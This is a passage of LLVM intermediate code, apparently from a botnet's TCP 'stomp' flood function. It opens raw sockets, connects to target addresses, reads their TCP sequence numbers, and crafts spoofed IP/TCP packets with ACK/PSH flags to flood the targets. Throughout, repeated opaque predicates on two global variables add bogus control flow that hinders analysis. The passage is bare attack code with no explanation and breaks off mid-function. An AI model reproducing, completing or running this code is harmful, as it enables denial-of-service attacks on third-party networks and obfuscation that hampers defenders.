  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %911

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %911

; <label>:114:                                    ; preds = %106
  %115 = load i32, i32* @x.29
  %116 = load i32, i32* @y.30
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %114
  store i32 0, i32* %9, align 4
  %123 = load i32, i32* @x.29
  %124 = load i32, i32* @y.30
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %131

; <label>:131:                                    ; preds = %originalBBpart2292, %originalBBpart2
  %132 = load i32, i32* %9, align 4
  %133 = load i8, i8* %5, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %735

; <label>:136:                                    ; preds = %131
  br label %137

; <label>:137:                                    ; preds = %originalBBpart2279, %620, %136
  %138 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %138, i32* %26, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  br label %716

; <label>:141:                                    ; preds = %137
  %142 = load i32, i32* @x.29
  %143 = load i32, i32* @y.30
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %141
  %150 = load i32, i32* %26, align 4
  %151 = load i32, i32* %26, align 4
  %152 = call i32 (i32, i32, ...) @fcntl(i32 %151, i32 3, i32 0)
  %153 = or i32 %152, 2048
  %154 = call i32 (i32, i32, ...) @fcntl(i32 %150, i32 4, i32 %153)
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %155, align 4
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 2
  %161 = load i8, i8* %160, align 4
  %162 = zext i8 %161 to i32
  %163 = icmp slt i32 %162, 32
  %164 = load i32, i32* @x.29
  %165 = load i32, i32* @y.30
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %163, label %172, label %193

; <label>:172:                                    ; preds = %originalBBpart24
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #7
  %180 = call i32 @rand_next()
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = lshr i32 %180, %187
  %189 = add i32 %179, %188
  %190 = call i32 @htonl(i32 %189) #7
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %192 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %191, i32 0, i32 0
  store i32 %190, i32* %192, align 4
  br label %202

; <label>:193:                                    ; preds = %originalBBpart24
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  br label %202

; <label>:202:                                    ; preds = %193, %172
  %203 = load i16, i16* %17, align 2
  %204 = zext i16 %203 to i32
  %205 = icmp eq i32 %204, 65535
  br i1 %205, label %206, label %211

; <label>:206:                                    ; preds = %202
  %207 = call i32 @rand_next()
  %208 = and i32 %207, 65535
  %209 = trunc i32 %208 to i16
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %209, i16* %210, align 2
  br label %231

; <label>:211:                                    ; preds = %202
  %212 = load i32, i32* @x.29
  %213 = load i32, i32* @y.30
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %211
  %220 = load i16, i16* %17, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %221, i16* %222, align 2
  %223 = load i32, i32* @x.29
  %224 = load i32, i32* @y.30
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %231

; <label>:231:                                    ; preds = %originalBBpart28, %206
  %232 = load i32, i32* %26, align 4
  %233 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %234 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %234, %struct.sockaddr** %233, align 8
  %235 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %236 = load %struct.sockaddr*, %struct.sockaddr** %235, align 8
  %237 = call i32 @connect(i32 %232, %struct.sockaddr* %236, i32 16)
  %238 = call i64 @time(i64* null) #6
  store i64 %238, i64* %31, align 8
  br label %239

; <label>:239:                                    ; preds = %714, %231
  store i32 16, i32* %29, align 4
  %240 = load i32, i32* %10, align 4
  %241 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %242 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %243 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %243, %struct.sockaddr** %242, align 8
  %244 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %245 = load %struct.sockaddr*, %struct.sockaddr** %244, align 8
  %246 = call i64 @recvfrom(i32 %240, i8* %241, i64 256, i32 16384, %struct.sockaddr* %245, i32* %29)
  %247 = trunc i64 %246 to i32
  store i32 %247, i32* %33, align 4
  %248 = load i32, i32* %33, align 4
  %249 = icmp eq i32 %248, -1
  br i1 %249, label %250, label %251

; <label>:250:                                    ; preds = %239
  br label %911

; <label>:251:                                    ; preds = %239
  %252 = load i32, i32* @x.29
  %253 = load i32, i32* @y.30
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %251
  %260 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %261 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %260, i32 0, i32 0
  %262 = load i32, i32* %261, align 4
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %264 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 4
  %266 = icmp eq i32 %262, %265
  %267 = load i32, i32* @x.29
  %268 = load i32, i32* @y.30
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %266, label %275, label %674

; <label>:275:                                    ; preds = %originalBBpart212
  %276 = load i32, i32* @x.29
  %277 = load i32, i32* @y.30
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %275
  %284 = load i32, i32* %33, align 4
  %285 = sext i32 %284 to i64
  %286 = icmp ugt i64 %285, 40
  %287 = load i32, i32* @x.29
  %288 = load i32, i32* @y.30
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %286, label %295, label %674

; <label>:295:                                    ; preds = %originalBBpart216
  %296 = load i32, i32* @x.29
  %297 = load i32, i32* @y.30
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %295
  %304 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %305 = getelementptr inbounds i8, i8* %304, i64 20
  %306 = bitcast i8* %305 to %struct.tcphdr*
  store %struct.tcphdr* %306, %struct.tcphdr** %35, align 8
  %307 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = load i16, i16* %308, align 4
  %310 = zext i16 %309 to i32
  %311 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %312 = load i16, i16* %311, align 2
  %313 = zext i16 %312 to i32
  %314 = icmp eq i32 %310, %313
  %315 = load i32, i32* @x.29
  %316 = load i32, i32* @y.30
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %314, label %323, label %657

; <label>:323:                                    ; preds = %originalBBpart220
  %324 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = lshr i16 %326, 9
  %328 = and i16 %327, 1
  %329 = zext i16 %328 to i32
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %588

; <label>:331:                                    ; preds = %323
  %332 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = lshr i16 %334, 12
  %336 = and i16 %335, 1
  %337 = zext i16 %336 to i32
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %339, label %588

; <label>:339:                                    ; preds = %331
  %340 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %341 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %346, i32 0, i32 0
  store i32 %342, i32* %347, align 4
  %348 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 2
  %350 = load i32, i32* %349, align 4
  %351 = call i32 @ntohl(i32 %350) #7
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 1
  store i32 %351, i32* %356, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 3
  %359 = load i32, i32* %358, align 4
  %360 = call i32 @ntohl(i32 %359) #7
  %361 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %364, i32 0, i32 2
  store i32 %360, i32* %365, align 4
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  %368 = load i16, i16* %367, align 2
  %369 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %372, i32 0, i32 3
  store i16 %368, i16* %373, align 4
  %374 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %375 = load i16, i16* %374, align 2
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 4
  store i16 %375, i16* %380, align 2
  %381 = load i32, i32* %24, align 4
  %382 = sext i32 %381 to i64
  %383 = add i64 40, %382
  %384 = call noalias i8* @malloc(i64 %383) #6
  %385 = load i8**, i8*** %12, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds i8*, i8** %385, i64 %387
  store i8* %384, i8** %388, align 8
  %389 = load i8**, i8*** %12, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds i8*, i8** %389, i64 %391
  %393 = load i8*, i8** %392, align 8
  %394 = bitcast i8* %393 to %struct.iphdr*
  store %struct.iphdr* %394, %struct.iphdr** %36, align 8
  %395 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i64 1
  %397 = bitcast %struct.iphdr* %396 to %struct.tcphdr*
  store %struct.tcphdr* %397, %struct.tcphdr** %37, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i64 1
  %400 = bitcast %struct.tcphdr* %399 to i8*
  store i8* %400, i8** %38, align 8
  %401 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %402 = bitcast %struct.iphdr* %401 to i8*
  %403 = load i8, i8* %402, align 4
  %404 = and i8 %403, 15
  %405 = or i8 %404, 64
  store i8 %405, i8* %402, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = bitcast %struct.iphdr* %406 to i8*
  %408 = load i8, i8* %407, align 4
  %409 = and i8 %408, -16
  %410 = or i8 %409, 5
  store i8 %410, i8* %407, align 4
  %411 = load i8, i8* %13, align 1
  %412 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 1
  store i8 %411, i8* %413, align 1
  %414 = load i32, i32* %24, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 40, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 2
  store i16 %418, i16* %420, align 2
  %421 = load i16, i16* %14, align 2
  %422 = call zeroext i16 @htons(i16 zeroext %421) #7
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 3
  store i16 %422, i16* %424, align 4
  %425 = load i8, i8* %15, align 1
  %426 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 5
  store i8 %425, i8* %427, align 4
  %428 = load i8, i8* %16, align 1
  %429 = icmp ne i8 %428, 0
  br i1 %429, label %430, label %450

; <label>:430:                                    ; preds = %339
  %431 = load i32, i32* @x.29
  %432 = load i32, i32* @y.30
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %430
  %439 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %440 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 4
  store i16 %439, i16* %441, align 2
  %442 = load i32, i32* @x.29
  %443 = load i32, i32* @y.30
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %450

; <label>:450:                                    ; preds = %originalBBpart224, %339
  %451 = load i32, i32* @x.29
  %452 = load i32, i32* @y.30
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %450
  %459 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 6
  store i8 6, i8* %460, align 1
  %461 = load i32, i32* @LOCAL_ADDR, align 4
  %462 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 8
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 9
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 3
  %477 = load i16, i16* %476, align 4
  %478 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 0
  store i16 %477, i16* %479, align 4
  %480 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 2
  %486 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 1
  store i16 %485, i16* %487, align 2
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 2
  %493 = load i32, i32* %492, align 4
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 2
  store i32 %493, i32* %495, align 4
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 1
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 3
  store i32 %501, i32* %503, align 4
  %504 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 4
  %506 = load i16, i16* %505, align 4
  %507 = and i16 %506, -241
  %508 = or i16 %507, 128
  store i16 %508, i16* %505, align 4
  %509 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 4
  %511 = load i16, i16* %510, align 4
  %512 = and i16 %511, -257
  %513 = or i16 %512, 256
  store i16 %513, i16* %510, align 4
  %514 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = and i16 %516, -4097
  %518 = or i16 %517, 4096
  store i16 %518, i16* %515, align 4
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 5
  store i16 %521, i16* %523, align 2
  %524 = load i8, i8* %18, align 1
  %525 = sext i8 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 4
  %528 = load i16, i16* %527, align 4
  %529 = and i16 %525, 1
  %530 = shl i16 %529, 13
  %531 = and i16 %528, -8193
  %532 = or i16 %531, %530
  store i16 %532, i16* %527, align 4
